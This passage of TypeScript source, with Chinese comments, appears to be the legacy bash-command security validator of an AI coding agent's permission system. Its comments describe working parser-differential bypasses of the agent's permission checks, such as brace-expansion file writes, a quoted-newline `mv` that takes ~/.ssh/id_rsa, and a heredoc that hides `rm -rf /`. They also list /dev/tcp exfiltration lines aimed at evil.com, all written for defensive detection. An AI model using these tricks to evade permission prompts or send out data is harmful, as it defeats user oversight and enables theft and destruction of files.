  // （例如 `find . -exec cmd {} \;`）。跳过昂贵的 regex 检查。
  if (context.treeSitter && !context.treeSitter.hasActualOperatorNodes) {
    return { behavior: 'passthrough', message: 'No operator nodes in AST' }
  }

  if (hasBackslashEscapedOperator(context.originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.BACKSLASH_ESCAPED_OPERATORS,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains a backslash before a shell operator (;, |, &, <, >) which can hide command structure',
    }
  }

  return {
    behavior: 'passthrough',
    message: 'No backslash-escaped operators',
  }
}

/**
 * 通过计算位置 `pos` 前的连续反斜杠数量，检查 `content` 中该位置的字符是否被转义。
 * 奇数表示被转义。
 */
function isEscapedAtPosition(content: string, pos: number): boolean {
  let backslashCount = 0
  let i = pos - 1
  while (i >= 0 && content[i] === '\\') {
    backslashCount++
    i--
  }
  return backslashCount % 2 === 1
}

/**
 * 检测未引用的花括号展开语法，Bash 会展开但 shell-quote/tree-sitter
 * 视为字面字符串。此解析差异允许权限绕过：
 *   git ls-remote {--upload-pack="touch /tmp/test",test}
 * 解析器看到一个字面参数，但 Bash 展开为：--upload-pack="touch /tmp/test" test
 *
 * 花括号展开有两种形式：
 *   1. 逗号分隔：{a,b,c} → a b c
 *   2. 序列：{1..5} → 1 2 3 4 5
 *
 * 单引号和双引号都抑制 Bash 的花括号展开，所以我们使用
 * 已剥离两种引号类型的 fullyUnquotedContent。
 * 反斜杠转义的花括号（\{、\}）也抑制展开。
 */
function validateBraceExpansion(context: ValidationContext): PermissionResult {
  // 使用剥离前内容以避免 stripSafeRedirections 产生反斜杠相邻
  // 导致的假阴性（例如 `\>/dev/null{a,b}` → 剥离后 `\{a,b}`，
  // 使 isEscapedAtPosition 认为花括号被转义）。
  const content = context.fullyUnquotedPreStrip

  // 安全性：检查 fullyUnquoted 内容中花括号计数不匹配。
  // 不匹配表明引号花括号（例如 `'{'` 或 `"{"`）被
  // extractQuotedContent 剥离，在我们分析的内容中留下不平衡的花括号。
  // 我们下方的深度匹配算法假设花括号平衡 ——
  // 不匹配时，它在错误位置关闭，遗漏 bash 算法会找到的逗号。
  //
  // 攻击：`git diff {@'{'0},--output=/tmp/pwned}`
  //   - 原始：2 个 `{`、2 个 `}`（引号 `'{'` 计为内容，非操作符）
  //   - fullyUnquoted：`git diff {@0},--output=/tmp/pwned}` —— 1 个 `{`、2 个 `}`！
  //   - 我们的深度匹配器：在第一个 `}`（`0` 之后）关闭，inner=`@0`，无 `,`
  //   - Bash（原始）：引号 `{` 是内容；第一个未引用 `}` 还没有
  //     `,` → bash 视为字面内容，继续扫描 → 找到 `,`
  //     → 最终 `}` 关闭 → 展开为 `@{0} --output=/tmp/pwned`
  //   - git 将 diff 写入 /tmp/pwned。任意文件写入，零权限。
  //
  // 我们只计数未转义的花括号（反斜杠转义的花括号在 bash 中是字面值）。
  // 如果计数不匹配且至少存在一个未转义 `{`，则屏蔽 ——
  // 我们的深度匹配在此内容上不可信。
  let unescapedOpenBraces = 0
  let unescapedCloseBraces = 0
  for (let i = 0; i < content.length; i++) {
    if (content[i] === '{' && !isEscapedAtPosition(content, i)) {
      unescapedOpenBraces++
    } else if (content[i] === '}' && !isEscapedAtPosition(content, i)) {
      unescapedCloseBraces++
    }
  }
  // 只在 CLOSE 计数超过 open 计数时屏蔽 —— 这是特定的
  // 攻击特征。`}` 比 `{` 多意味着引号 `{` 被剥离
  // （bash 视其为内容，我们看到多余的 `}` 无对应）。反向情况
  // （`{` 比 `}` 多）通常是合法的未闭合/转义花括号，如
  // `{foo` 或 `{a,b\}`，bash 反正不展开。
  if (unescapedOpenBraces > 0 && unescapedCloseBraces > unescapedOpenBraces) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.BRACE_EXPANSION,
      subId: 2,
    })
    return {
      behavior: 'ask',
      message:
        'Command has excess closing braces after quote stripping, indicating possible brace expansion obfuscation',
    }
  }

  // 安全性：另外检查原始命令（剥离引号前）中
  // 未引用花括号上下文内的 `'{'` 或 `"{"` —— 这是特定的
  // 攻击原语。外层未引用 `{...}` 内的引号花括号
  // 基本上始终是混淆尝试；合法命令不会在花括号展开内嵌套
  // 引号花括号（awk/find 模式完全引用，
  // 如 `awk '{print $1}'`，其中外层花括号也在引号内）。
  //
  // 即使攻击者构造平衡剥离花括号的 payload，这也捕获攻击
  // （纵深防御）。我们使用简单启发式：如果
  // 原始命令有 `'{'` 或 `'}'` 或 `"{"` 或 `"}"`（引号单个花括号）
  // 且也有未引用 `{`，则可疑。
  if (unescapedOpenBraces > 0) {
    const orig = context.originalCommand
    // 查找引号单花括号模式：'{'、'}'、"{"、"}"
    // 这些是攻击原语 —— 引号包裹的花括号字符。
    if (/['"][{}]['"]/.test(orig)) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.BRACE_EXPANSION,
        subId: 3,
      })
      return {
        behavior: 'ask',
        message:
          'Command contains quoted brace character inside brace context (potential brace expansion obfuscation)',
      }
    }
  }

  // 扫描未转义的 `{` 字符，然后检查它们是否形成花括号展开。
  // 我们使用手动扫描而非简单的 regex 先行断言，因为
  // 先行断言无法处理双重转义反斜杠（\\{ 是未转义 `{`）。
  for (let i = 0; i < content.length; i++) {
    if (content[i] !== '{') continue
    if (isEscapedAtPosition(content, i)) continue

    // 通过跟踪嵌套深度查找匹配的未转义 `}`。
    // 之前的方法在嵌套 `{` 时会中断，遗漏外层
    // `{` 和嵌套 `{` 之间的逗号（例如 `{--upload-pack="evil",{test}}`）。
    let depth = 1
    let matchingClose = -1
    for (let j = i + 1; j < content.length; j++) {
      const ch = content[j]
      if (ch === '{' && !isEscapedAtPosition(content, j)) {
        depth++
      } else if (ch === '}' && !isEscapedAtPosition(content, j)) {
        depth--
        if (depth === 0) {
          matchingClose = j
          break
        }
      }
    }

    if (matchingClose === -1) continue

    // 检查此 `{` 与其匹配 `}` 之间最外层嵌套级别的 `,` 或 `..`。
    // 只有 depth-0 触发才重要 —— bash 在外层
    // 逗号/序列处分割花括号展开。
    let innerDepth = 0
    for (let k = i + 1; k < matchingClose; k++) {
      const ch = content[k]
      if (ch === '{' && !isEscapedAtPosition(content, k)) {
        innerDepth++
      } else if (ch === '}' && !isEscapedAtPosition(content, k)) {
        innerDepth--
      } else if (innerDepth === 0) {
        if (
          ch === ',' ||
          (ch === '.' && k + 1 < matchingClose && content[k + 1] === '.')
        ) {
          logEvent('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.BRACE_EXPANSION,
            subId: 1,
          })
          return {
            behavior: 'ask',
            message:
              'Command contains brace expansion that could alter command parsing',
          }
        }
      }
    }
    // 此级别无展开 —— 不要跳过；内部对将由
    // 外层循环的后续迭代捕获。
  }

  return {
    behavior: 'passthrough',
    message: 'No brace expansion detected',
  }
}

// 匹配 Unicode 空白字符，shell-quote 视其为词分隔符，
// 但 bash 视其为字面词内容。虽然此差异
// 有利于防御（shell-quote 过度拆分），但主动屏蔽这些
// 可防止未来边缘情况。
// eslint-disable-next-line no-misleading-character-class
const UNICODE_WS_RE =
  /[\u00A0\u1680\u2000-\u200A\u2028\u2029\u202F\u205F\u3000\uFEFF]/

function validateUnicodeWhitespace(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context
  if (UNICODE_WS_RE.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.UNICODE_WHITESPACE,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains Unicode whitespace characters that could cause parsing inconsistencies',
    }
  }
  return { behavior: 'passthrough', message: 'No Unicode whitespace' }
}

function validateMidWordHash(context: ValidationContext): PermissionResult {
  const { unquotedKeepQuoteChars } = context
  // 匹配前导为非空白字符的 #（词中 hash）。
  // shell-quote 把词中 # 视为注释起始，但 bash 视其为
  // 字面字符，造成解析器差异。
  //
  // 使用 unquotedKeepQuoteChars（保留引号分隔符但剥离
  // 引号内容）以捕获引号相邻的 # 如 'x'# —— fullyUnquotedPreStrip
  // 会剥离引号和内容，把 'x'# 变成只是 #（词首）。
  //
  // 安全性：也检查 CONTINUATION-JOINED 版本。context 由
  // 原始命令（continuation-join 之前）构建。对于 `foo\<NL>#bar`，
  // join 前 `#` 前导是 `\n`（空白 → `/\S#/` 不匹配），
  // join 后前导是 `o`（非空白 → 匹配）。shell-quote
  // 在 join 后文本上操作（行续行在 splitCommand 中 join），
  // 所以解析器差异在 join 后文本上体现。
  // 虽然不能直接利用（`#...` 片段仍作为自己的子命令提示），
  // 但这是纵深防御缺口 —— shell-quote 会从路径提取中丢弃
  // `#` 后内容。
  //
  // 排除 ${#，它是 bash 字符串长度语法（例如 ${#var}）。
  // 注意：先行断言必须紧邻 # 之前（而非 \S 之前），
  // 以检查正确的 2 字符窗口。
  const joined = unquotedKeepQuoteChars.replace(/\\+\n/g, match => {
    const backslashCount = match.length - 1
    return backslashCount % 2 === 1 ? '\\'.repeat(backslashCount - 1) : match
  })
  if (
    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() with atom search: fast when # absent
    /\S(?<!\$\{)#/.test(unquotedKeepQuoteChars) ||
    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- same as above
    /\S(?<!\$\{)#/.test(joined)
  ) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.MID_WORD_HASH,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains mid-word # which is parsed differently by shell-quote vs bash',
    }
  }
  return { behavior: 'passthrough', message: 'No mid-word hash' }
}

/**
 * 检测 `#` 注释包含会导致下游引号跟踪器（如 extractQuotedContent）失步的引号字符的情况。
 *
 * 在 bash 中，未引用 `#` 在一行后的所有内容都是注释 —— 注释内的
 * 引号字符是字面文本，不是引号切换。但我们的
 * 引号跟踪函数不处理注释，所以 `#` 后的 `'` 或 `"`
 * 会切换它们的引号状态。攻击者可构造 `# ' "` 序列
 * 精确使跟踪器失步，导致后续内容（在后续行）
 * 看起来“在引号内”，而 bash 中实际未引用。
 *
 * 攻击示例：
 *   echo "it's" # ' " <<'MARKER'\n
 *   rm -rf /\n
 *   MARKER
 * bash 中：`#` 开始注释，`rm -rf /` 在第 2 行执行。
 * extractQuotedContent 中：位置 14（# 后）的 `'` 开启单
 * 引号，MARKER 前的 `'` 关闭它。但 MARKER 后的 `'` 开启
 * 另一个单引号，吞掉换行和 `rm -rf /`，所以
 * validateNewlines 看不到未引用换行。
 *
 * 防御：如果看到未引用 `#` 后跟任何引号字符（同一行），
 * 视为误解析问题。合法命令极少在注释中有
 * 引号字符（如果有，用户可手动批准）。
 */
function validateCommentQuoteDesync(
  context: ValidationContext,
): PermissionResult {
  // Tree-sitter 路径：tree-sitter 正确识别注释节点和
  // 引号内容。失步问题是关于 regex 引号跟踪被
  // 注释内的引号字符混淆。当 tree-sitter 提供
  // 引号上下文时，此失步不会发生 —— 无论命令是否含注释，
  // AST 都是权威的。
  if (context.treeSitter) {
    return {
      behavior: 'passthrough',
      message: 'Tree-sitter quote context is authoritative',
    }
  }

  const { originalCommand } = context

  // 使用与 extractQuotedContent 相同的（正确）逻辑逐字符跟踪引号状态：
  // 单引号在双引号内不切换。
  // 遇到未引用 `#` 时，检查该行剩余部分（到
  // 换行）是否含任何引号字符。
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < originalCommand.length; i++) {
    const char = originalCommand[i]

    if (escaped) {
      escaped = false
      continue
    }

    if (inSingleQuote) {
      if (char === "'") inSingleQuote = false
      continue
    }

    if (char === '\\') {
      escaped = true
      continue
    }

    if (inDoubleQuote) {
      if (char === '"') inDoubleQuote = false
      // 双引号内的单引号是字面值 —— 不切换
      continue
    }

    if (char === "'") {
      inSingleQuote = true
      continue
    }

    if (char === '"') {
      inDoubleQuote = true
      continue
    }

    // 未引用 `#` —— bash 中，这开始注释。检查该行剩余
    // 是否含会使其他跟踪器失步的引号字符。
    if (char === '#') {
      const lineEnd = originalCommand.indexOf('\n', i)
      const commentText = originalCommand.slice(
        i + 1,
        lineEnd === -1 ? originalCommand.length : lineEnd,
      )
      if (/['"]/.test(commentText)) {
        logEvent('tengu_bash_security_check_triggered', {
          checkId: BASH_SECURITY_CHECK_IDS.COMMENT_QUOTE_DESYNC,
        })
        return {
          behavior: 'ask',
          message:
            'Command contains quote characters inside a # comment which can desync quote tracking',
        }
      }
      // 跳到行尾（剩余是注释）
      if (lineEnd === -1) break
      i = lineEnd // 循环递增将移过换行
    }
  }

  return { behavior: 'passthrough', message: 'No comment quote desync' }
}

/**
 * 检测引号字符串内的换行，且下一行会被
 * stripCommentLines 剥离（trimmed 行以 `#` 开头）的情况。
 *
 * bash 中，引号内的 `\n` 是字面字符和参数的一部分。
 * 但 stripCommentLines（由 stripSafeWrappers 在 bashPermissions 中
 * 路径校验和规则匹配前调用）通过
 * `command.split('\n')` 逐行处理命令，不跟踪引号状态。引号换行让
 * 攻击者能把下一行定位为（trim 后）以 `#` 开头，导致
 * stripCommentLines 完全丢弃该行 —— 从路径校验和权限规则匹配中
 * 隐藏敏感路径或参数。
 *
 * 攻击示例（在 acceptEdits 模式下无任何 Bash 规则时自动允许）：
 *   mv ./decoy '<\n>#' ~/.ssh/id_rsa ./exfil_dir
 * bash：把 ./decoy 和 ~/.ssh/id_rsa 移入 ./exfil_dir/（对 `\n#` 报错）。
 * stripSafeWrappers：第 2 行以 `#` 开头 → 剥离 → "mv ./decoy '"。
 * shell-quote：丢弃不平衡的尾随引号 → ["mv", "./decoy"]。
 * checkPathConstraints：只看到 ./decoy（在 cwd 中）→ passthrough。
 * acceptEdits 模式：带全 cwd 路径的 mv → 允许。零点击，无警告。
 *
 * 也适用于 cp（外泄）、rm/rm -rf（删除任意文件/目录）。
 *
 * 防御：只屏蔽特定的 stripCommentLines 触发 —— 引号内换行
 * 且下一行 trim 后以 `#` 开头。这是捕获解析器差异的最小
 * 检查，同时保留合法多行引号参数（echo 'line1\nline2'、grep 模式等）。
 * 安全 heredoc（$(cat <<'EOF'...)）和 git commit -m "..." 由
 * 早期验证器处理，从不到达此检查。
 *
 * 此验证器不在 nonMisparsingValidators 中 —— 其 ask 结果会获得
 * isBashSecurityCheckForMisparsing: true，在权限流程
 * bashPermissions.ts 中任何基于行的处理运行前导致提前阻止。
 */
function validateQuotedNewline(context: ValidationContext): PermissionResult {
  const { originalCommand } = context

  // 快速路径：必须同时有换行字节和某处的 # 字符。
  // stripCommentLines 只剥离 trim().startsWith('#') 的行，所以
  // 无 # 意味着无可能触发。
  if (!originalCommand.includes('\n') || !originalCommand.includes('#')) {
    return { behavior: 'passthrough', message: 'No newline or no hash' }
  }

  // 跟踪引号状态。镜像 extractQuotedContent / validateCommentQuoteDesync：
  // - 单引号在双引号内不切换
  // - 反斜杠转义下一字符（单引号内不转义）
  // stripCommentLines 以 '\n' 分割（非 \r），所以我们只把 \n 当作行
  // 分隔符。行内 \r 由 trim() 移除，不改变
  // trimmed-starts-with-# 检查。
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < originalCommand.length; i++) {
    const char = originalCommand[i]

    if (escaped) {
      escaped = false
      continue
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }

    // 引号内换行：下一行（bash 视角）开始于
    // 引号字符串内。检查该行是否会被
    // stripCommentLines 剥离 —— 即 trim() 后是否以 `#` 开头？
    // 这精确镜像：lines.filter(l => !l.trim().startsWith('#'))
    if (char === '\n' && (inSingleQuote || inDoubleQuote)) {
      const lineStart = i + 1
      const nextNewline = originalCommand.indexOf('\n', lineStart)
      const lineEnd = nextNewline === -1 ? originalCommand.length : nextNewline
      const nextLine = originalCommand.slice(lineStart, lineEnd)
      if (nextLine.trim().startsWith('#')) {
        logEvent('tengu_bash_security_check_triggered', {
          checkId: BASH_SECURITY_CHECK_IDS.QUOTED_NEWLINE,
        })
        return {
          behavior: 'ask',
          message:
            'Command contains a quoted newline followed by a #-prefixed line, which can hide arguments from line-based permission checks',
        }
      }
    }
  }

  return { behavior: 'passthrough', message: 'No quoted newline-hash pattern' }
}

/**
 * 校验命令不使用可绕过安全检查的 Zsh 特有危险命令。
 * 这些命令提供加载内核模块、原始文件 I/O、网络访问和伪终端执行等
 * 能力，绕过正常权限检查。
 *
 * 也捕获 `fc -e`（可在命令历史上执行任意编辑器），
 * 以及带 `-c` 的 `emulate`（等价于 eval）。
 */
function validateZshDangerousCommands(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context

  // 从原始命令提取基础命令，剥离前导
  // 空白、环境变量赋值和 Zsh precommand 修饰符。
  // 例如 "FOO=bar command builtin zmodload" -> "zmodload"
  const ZSH_PRECOMMAND_MODIFIERS = new Set([
    'command',
    'builtin',
    'noglob',
    'nocorrect',
  ])
  const trimmed = originalCommand.trim()
  const tokens = trimmed.split(/\s+/)
  let baseCmd = ''
  for (const token of tokens) {
    // 跳过环境变量赋值（VAR=value）
    if (/^[A-Za-z_]\w*=/.test(token)) continue
    // 跳过 Zsh precommand 修饰符（它们不改变运行的命令）
    if (ZSH_PRECOMMAND_MODIFIERS.has(token)) continue
    baseCmd = token
    break
  }

  if (ZSH_DANGEROUS_COMMANDS.has(baseCmd)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.ZSH_DANGEROUS_COMMANDS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: `Command uses Zsh-specific '${baseCmd}' which can bypass security checks`,
    }
  }

  // 检查 `fc -e`，它允许通过编辑器执行任意命令
  // 无 -e 的 fc 是安全的（只列出历史），但 -e 指定编辑器
  // 对命令运行，实际上是 eval
  if (baseCmd === 'fc' && /\s-\S*e/.test(trimmed)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.ZSH_DANGEROUS_COMMANDS,
      subId: 2,
    })
    return {
      behavior: 'ask',
      message:
        "Command uses 'fc -e' which can execute arbitrary commands via editor",
    }
  }

  return {
    behavior: 'passthrough',
    message: 'No Zsh dangerous commands',
  }
}

/**
 * 检测 Bash 网络 pseudo-device 路径 /dev/tcp/ 和 /dev/udp/ 的使用。
 *
 * 安全性：Bash 将 /dev/tcp/host/port 和 /dev/udp/host/port 解释为
 * 网络连接（当用于 redirect 或作为 cat 等命令的参数时）。这允许
 * 无需任何网络工具即可数据外泄：
 *
 *   echo "secrets" > /dev/tcp/evil.com/4444
 *   cat < /dev/tcp/evil.com/8080
 *   exec 3<>/dev/udp/evil.com/53
 *   cat /dev/tcp/attacker.com/8080
 *
 * 这些路径不是真实文件系统条目 —— 由 Bash
 * 自身拦截。正常路径校验（validatePath）无法捕获它们，因为
 * 文件在磁盘上不存在。
 */
const NETWORK_DEVICE_PATH_RE = /\/dev\/(tcp|udp)\/[^/\s"'`$]+\/\d+/i

function validateNetworkDeviceRedirect(
  context: ValidationContext,
): PermissionResult {
  // 在 fullyUnquotedContent 中检查以捕获引用变体如 "/dev/tcp/..."
  if (NETWORK_DEVICE_PATH_RE.test(context.fullyUnquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.NETWORK_DEVICE_REDIRECT,
    })
    return {
      behavior: 'ask',
      message:
        'Command uses /dev/tcp or /dev/udp network pseudo-device which can be used for network access',
    }
  }

  return {
    behavior: 'passthrough',
    message: 'No network device redirects',
  }
}

// 匹配在 shell 命令中无合法用途的不可打印控制字符：
// 0x00-0x08、0x0B-0x0C、0x0E-0x1F、0x7F。排除制表符（0x09）、
// 换行（0x0A）和回车（0x0D），它们由其他验证器处理。Bash 静默丢弃
// null 字节并忽略大多数控制字符，所以攻击者可用它们让元字符
// 溜过我们的检查，而 bash 仍执行它们（例如 "echo safe\x00; rm -rf /"）。
// eslint-disable-next-line no-control-regex
// biome-ignore lint/suspicious/noControlCharactersInRegex: intentional control character matching for security validation
const CONTROL_CHAR_RE = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/

/**
 * @deprecated 遗留 regex/shell-quote 路径。只在 tree-sitter 不可用时使用。
 * 主 gate 是 parseForSecurity（ast.ts）。
 */
export function bashCommandIsSafe_DEPRECATED(
  command: string,
): PermissionResult {
  // 安全性：在任何其他处理前屏蔽控制字符。null 字节
  // 和其他不可打印字符被 bash 静默丢弃，但会混淆我们的
  // 验证器，使相邻的元字符溜过。
  if (CONTROL_CHAR_RE.test(command)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.CONTROL_CHARACTERS,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains non-printable control characters that could be used to bypass security checks',
      isBashSecurityCheckForMisparsing: true,
    }
  }

  // 安全性：检测利用 shell-quote 对单引号内反斜杠错误处理的
  // '\' 模式。必须在 shell-quote 解析前运行。
  if (hasShellQuoteSingleQuoteBug(command)) {
    return {
      behavior: 'ask',
      message:
        'Command contains single-quoted backslash pattern that could bypass security checks',
      isBashSecurityCheckForMisparsing: true,
    }
  }

  // 安全性：在运行安全验证器前剥离 heredoc body。
  // 只剥离带引号/转义分隔符（<<'EOF'、<<\EOF）的 body，其中
  // body 是字面文本 —— $()、反引号和 ${} 不展开。
  // 未引用的 heredoc（<<EOF）会经历完整 shell 展开，所以其 body
  // 可能包含验证器必须看到的可执行命令替换。
  // 当 extractHeredocs 退出（无法安全解析）时，原始命令
  // 会经过所有验证器 —— 这是安全方向。
  const { processedCommand } = extractHeredocs(command, { quotedOnly: true })

  const baseCommand = command.split(' ')[0] || ''
  const { withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars } =
    extractQuotedContent(processedCommand, baseCommand === 'jq')

  const context: ValidationContext = {
    originalCommand: command,
    baseCommand,
    unquotedContent: withDoubleQuotes,
    fullyUnquotedContent: stripSafeRedirections(fullyUnquoted),
    fullyUnquotedPreStrip: fullyUnquoted,
    unquotedKeepQuoteChars,
  }

  const earlyValidators = [
    validateEmpty,
    validateIncompleteCommands,
    validateSafeCommandSubstitution,
    validateGitCommit,
  ]

  for (const validator of earlyValidators) {
    const result = validator(context)
    if (result.behavior === 'allow') {
      return {
        behavior: 'passthrough',
        message:
          result.decisionReason?.type === 'other' ||
          result.decisionReason?.type === 'safetyCheck'
            ? result.decisionReason.reason
            : 'Command allowed',
      }
    }
    if (result.behavior !== 'passthrough') {
      return result.behavior === 'ask'
        ? { ...result, isBashSecurityCheckForMisparsing: true as const }
        : result
    }
  }

  // 不设置 isBashSecurityCheckForMisparsing 的验证器 —— 其 ask
  // 结果走标准权限流程，而非提前阻止。
  // LF 换行和 redirection 是 splitCommand 正确处理的正常模式，
  // 不是误解析问题。
  //
  // 注意：validateCarriageReturn 不在此 —— CR 是误解析问题。
  // shell-quote 的 `[^\s]` 把 CR 视为词分隔符（JS `\s` ⊃ \r），但
  // bash IFS 不包含 CR。splitCommand 将 CR 折叠为空格，这才是
  // 误解析。完整攻击轨迹见 validateCarriageReturn。
  const nonMisparsingValidators = new Set([
    validateNewlines,
    validateRedirections,
  ])

  const validators = [
    validateJqCommand,
    validateObfuscatedFlags,
    validateShellMetacharacters,
    validateDangerousVariables,
    // 在 validateNewlines 前运行 comment-quote-desync：它检测
    // 引号跟踪器因 # 注释失步而遗漏换行的情况。
    validateCommentQuoteDesync,
    // 在 validateNewlines 前运行 quoted-newline：它检测反向情况
    // （引号内换行，validateNewlines 设计上忽略）。引号
    // 换行让攻击者跨行分割命令，使基于行的
    // 处理（stripCommentLines）丢弃敏感内容。
    validateQuotedNewline,
    // CR 检查在 validateNewlines 前运行 —— CR 是误解析问题
    // （shell-quote/bash 分词差异），LF 不是。
    validateCarriageReturn,
    validateNewlines,
    validateIFSInjection,
    validateProcEnvironAccess,
    validateDangerousPatterns,
    validateRedirections,
    validateBackslashEscapedWhitespace,
    validateBackslashEscapedOperators,
    validateUnicodeWhitespace,
    validateMidWordHash,
    validateBraceExpansion,
    validateZshDangerousCommands,
    validateNetworkDeviceRedirect,
    // 最后运行畸形 token 检查 —— 其他验证器应先捕获特定模式
    // （例如 $() 替换、反引号等），因为它们有更精确的错误消息
    validateMalformedTokenInjection,
  ]

  // 安全性：当 non-misparsing 验证器返回 'ask' 时，如果列表中
  // 后面还有 misparsing 验证器，我们绝不能短路。
  // Non-misparsing ask 结果在 bashPermissions.ts:~1301-1303 被丢弃
  // （gate 只在 isBashSecurityCheckForMisparsing 设置时阻止）。如果
  // validateRedirections（索引 10，non-misparsing）先对 `>` 触发，它
  // 返回不带 flag 的 ask —— 但 validateBackslashEscapedOperators（索引 12，
  // misparsing）会带 flag 捕获 `\;`。短路会让
  // 类似 `cat safe.txt \; echo /etc/passwd > ./out` 的 payload 溜过。
  //
  // 修复：延迟 non-misparsing ask 结果。继续运行验证器；如果任何
  // misparsing 验证器触发，返回那个（带 flag）。只有到达
  // 末尾而无 misparsing ask 时，才返回延迟的 non-misparsing ask。
  let deferredNonMisparsingResult: PermissionResult | null = null
  for (const validator of validators) {
    const result = validator(context)
    if (result.behavior === 'ask') {
      if (nonMisparsingValidators.has(validator)) {
        if (deferredNonMisparsingResult === null) {
          deferredNonMisparsingResult = result
        }
        continue
      }
      return { ...result, isBashSecurityCheckForMisparsing: true as const }
    }
  }
  if (deferredNonMisparsingResult !== null) {
    return deferredNonMisparsingResult
  }

  return {
    behavior: 'passthrough',
    message: 'Command passed all security checks',
  }
}

/**
 * @deprecated 遗留 regex/shell-quote 路径。只在 tree-sitter 不可用时使用。
 * 主 gate 是 parseForSecurity（ast.ts）。
 *
 * bashCommandIsSafe 的异步版本，在可用时使用 tree-sitter
 * 进行更精确解析。tree-sitter 不可用时回退到同步 regex 版本。
 *
 * 异步调用方（bashPermissions.ts、bashCommandHelpers.ts）应使用此版本。
 * 同步调用方（readOnlyValidation.ts）应继续使用 bashCommandIsSafe()。
 */
export async function bashCommandIsSafeAsync_DEPRECATED(
  command: string,
  onDivergence?: () => void,
): Promise<PermissionResult> {
  // 尝试获取 tree-sitter 分析
  const parsed = await ParsedCommand.parse(command)
  const tsAnalysis = parsed?.getTreeSitterAnalysis() ?? null

  // 如果无 tree-sitter，回退到同步版本
  if (!tsAnalysis) {
    return bashCommandIsSafe_DEPRECATED(command)
  }

  // 运行相同安全检查，但使用 tree-sitter 丰富的上下文。
  // 早期检查（控制字符、shell-quote bug）不从
  // tree-sitter 受益，所以我们相同运行。
  if (CONTROL_CHAR_RE.test(command)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.CONTROL_CHARACTERS,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains non-printable control characters that could be used to bypass security checks',
      isBashSecurityCheckForMisparsing: true,
    }
  }

  if (hasShellQuoteSingleQuoteBug(command)) {
    return {
      behavior: 'ask',
      message:
        'Command contains single-quoted backslash pattern that could bypass security checks',
      isBashSecurityCheckForMisparsing: true,
    }
  }

  const { processedCommand } = extractHeredocs(command, { quotedOnly: true })

  const baseCommand = command.split(' ')[0] || ''

  // 使用 tree-sitter 引号上下文进行更精确分析
  const tsQuote = tsAnalysis.quoteContext
  const regexQuote = extractQuotedContent(
    processedCommand,
    baseCommand === 'jq',
  )

  // 使用 tree-sitter 引号上下文作为主要，但保留 regex 作为参考
  // 用于差异日志
  const withDoubleQuotes = tsQuote.withDoubleQuotes
  const fullyUnquoted = tsQuote.fullyUnquoted
  const unquotedKeepQuoteChars = tsQuote.unquotedKeepQuoteChars

  const context: ValidationContext = {
    originalCommand: command,
    baseCommand,
    unquotedContent: withDoubleQuotes,
    fullyUnquotedContent: stripSafeRedirections(fullyUnquoted),
    fullyUnquotedPreStrip: fullyUnquoted,
    unquotedKeepQuoteChars,
    treeSitter: tsAnalysis,
  }

  // 记录 tree-sitter 与 regex 引号提取之间的差异。
  // 对 heredoc 命令跳过：tree-sitter 将（引号）heredoc body 剥离
  // 为空，而 regex 路径用占位字符串替换它们
  // （通过 extractHeredocs），所以两个输出永远不匹配。对每个
  // heredoc 命令记录差异会污染信号。
  //
  // onDivergence 回调：在 fanout 循环（bashPermissions.ts
  // 对 subcommands 的 Promise.all）中调用时，调用方将差异批处理为
  // 单个 logEvent 而非 N 个独立调用。每个 logEvent 触发
  // getEventMetadata() → buildProcessMetrics() → process.memoryUsage() →
  // /proc/self/stat 读取；使用 memoized 元数据时这些解析为 microtask
  // 并饿死事件循环（CC-643）。单命令调用方省略
  // 回调并获得原始的每次调用 logEvent 行为。
  if (!tsAnalysis.dangerousPatterns.hasHeredoc) {
    const hasDivergence =
      tsQuote.fullyUnquoted !== regexQuote.fullyUnquoted ||
      tsQuote.withDoubleQuotes !== regexQuote.withDoubleQuotes
    if (hasDivergence) {
      if (onDivergence) {
        onDivergence()
      } else {
        logEvent('tengu_tree_sitter_security_divergence', {
          quoteContextDivergence: true,
        })
      }
    }
  }

  const earlyValidators = [
    validateEmpty,
    validateIncompleteCommands,
    validateSafeCommandSubstitution,
    validateGitCommit,
  ]

  for (const validator of earlyValidators) {
    const result = validator(context)
    if (result.behavior === 'allow') {
      return {
        behavior: 'passthrough',
        message:
          result.decisionReason?.type === 'other' ||
          result.decisionReason?.type === 'safetyCheck'
            ? result.decisionReason.reason
            : 'Command allowed',
      }
    }
    if (result.behavior !== 'passthrough') {
      return result.behavior === 'ask'
        ? { ...result, isBashSecurityCheckForMisparsing: true as const }
        : result
    }
  }

  const nonMisparsingValidators = new Set([
    validateNewlines,
    validateRedirections,
